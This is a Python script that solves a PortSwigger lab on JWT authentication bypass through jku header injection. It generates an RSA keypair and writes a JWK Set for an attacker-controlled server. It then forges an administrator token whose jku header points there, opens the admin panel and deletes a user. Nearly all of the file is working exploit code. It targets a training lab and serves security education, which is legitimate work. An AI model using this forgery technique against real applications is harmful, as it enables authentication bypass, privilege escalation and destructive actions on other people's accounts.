"""
Lab 5: JWT authentication bypass via jku header injection
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
Difficulty: Practitioner

📝 The flaw: instead of embedding the key inline (jwk), the header's "jku"
points to a URL where the server fetches a JWK Set. If the server will fetch
ANY jku we provide, we host our own key there via the exploit server.

Requires: pip install pyjwt cryptography --break-system-packages
"""

import json

import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from utils import get_session, log, note, decode_jwt

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
WIENER = {"username": "wiener", "password": "peter"}


def generate_keypair():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return key, key.public_key()


def jwk_from_public_key(pub, kid="evil-kid"):
    numbers = pub.public_numbers()
    def b64(n, length):
        return pyjwt.utils.base64url_encode(n.to_bytes(length, "big")).decode()
    return {
        "kty": "RSA",
        "kid": kid,
        "use": "sig",
        "alg": "RS256",
        "n": b64(numbers.n, (numbers.n.bit_length() + 7) // 8),
        "e": b64(numbers.e, (numbers.e.bit_length() + 7) // 8),
    }


def build_jwks_file(jwk):
    """This is what gets hosted at /jwks.json on the exploit server."""
    return json.dumps({"keys": [jwk]})


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    _, payload = decode_jwt(token)

    priv, pub = generate_keypair()
    jwk = jwk_from_public_key(pub)

    jwks_body = build_jwks_file(jwk)
    out_path = "jwks.json"
    with open(out_path, "w") as f:
        f.write(jwks_body)
    log(f"Wrote JWK Set to {out_path} — host this at {EXPLOIT_SERVER}/jwks.json")

    payload["sub"] = "administrator"
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": jwk["kid"],
        "jku": f"{EXPLOIT_SERVER}/jwks.json",
    }

    pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    forged = pyjwt.encode(payload, pem, algorithm="RS256", headers=header)

    note("Make sure jwks.json is live on the exploit server BEFORE sending this.")
    s.cookies.set("session", forged)
    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
